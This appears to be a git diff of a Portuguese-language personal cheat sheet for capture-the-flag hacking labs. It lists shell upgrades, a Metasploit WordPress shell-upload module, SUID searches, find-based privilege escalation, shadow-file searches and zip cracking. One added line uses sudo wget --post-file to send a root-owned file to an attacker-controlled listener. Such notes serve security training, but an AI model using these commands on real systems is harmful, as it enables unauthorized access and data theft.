@@ -1,11 +1,13 @@
 my ip = 10.8.90.150
-ip machine = 10.10.2.223
+ip machine = 10.10.23.90
+
+
+admin 
 
 
 
 
-
-python -c "import pty; pty.spawn('/bin/bash')" #usar em shell
+python3 -c "import pty; pty.spawn('/bin/bash')" #usar em shell
 
 exploit/unix/webapp/wp_admin_shell_upload #wordpress
 
@@ -21,7 +23,7 @@ steghide extract -sf $imagem$.jpg #extrair img
 
 crontab --help #tentar em linux
 
-man scp #copiar arquivos de uma maquina
+man scp #copiar arquivos de uma maquina ssh por exemplo
 
 sudo --version #verificar versão do sudo
 
@@ -42,3 +44,45 @@ find / -name "*shadow" -exec ls -lt {} \; 2>/dev/null #achar arquivos com "shado
 exiftool #image.jpg #metadados padrões
 
 fcrackzip -vbDp <path-to-rockyou.txt> <filename> #quebrar zips
+
+ls -l /usr/bin/find #verificar permissões do find(pode ser trocado por outro programa)
+
+find $file-name -exec $command \; #O comando find vem com a opção de executar outros comandos caso tenhamos pemrissão de utiliza-lo
+
+find / -user root -perm -4000 -exec ls -ldb {} \; 2>>/dev/null #4000=suid buscar por arquivos suid em / e jogar todos os erros para /dev/null, executar ls caso tenhamos permissao de usar find
+
+find / -user root -perm -4000 -exec ls -ldb {} \; 2>>/dev/null | grep "/bin" #4000=suid buscar por arquivos suid em / e jogar todos os erros para /dev/null, executar ls caso tenhamos permissao de usar find, grep para mostrar apenas arquivos executaveis
+
+system-control #caso exista um binário com este nome(repositorio do git podemos copia-lo para dentro da máquina)
+
+l#comando  #executar comandos localmente via meterpreter(minha máquina)
+
+sed 'line-number!d' filename #pesquisar algo escrito em uma linha especifica de um arquivo
+
+ssh #user@#ip -i #arquivoComChave #usar em ssh quando tivermos a chave rsa
+
+sudo /usr/bin/wget --post-file=/root/root_flag.txt http://#ip:#porta que o netcat escuta no nosso pc  #caso tenhamos acesso ao wget como sudower
+
+showmount -e  <machine IP> #verificar nfs
+
+mount <machine IP>:<pasta do servidor que contem o arquivo> <pasta que salvarei> #baixar aquivo contido no nfs
+
+umount -f -l <caminho onde conectou o nfs> #NÃO ESQUECER DE DESMONTAR
+
+mysql -h remote-ip -u<username> -p<password> #efetuar login em mysqlserver
+
+show databases; #mostrar bancos de dados em um servidor mysql
+
+show tables; #mostrar tabelas em um banco de dados mysql
+
+select * from <campo>; #mostrar todos os dados em um campo de uma tabela em um servidor mysql
+
+strings <arquivo> #pesquisar determinada string no codigo de um arquivo, pode ser usado com | grep "como começa a string"
+
+stegoveritas <imagem> #dividir imagem em várias
+
+binwalk <arquivo> #ver possiveis extrações de um arquivo
+
+zsteg <arquivo> #arquivos com formatos que o steghide não consegue extrair
+
+
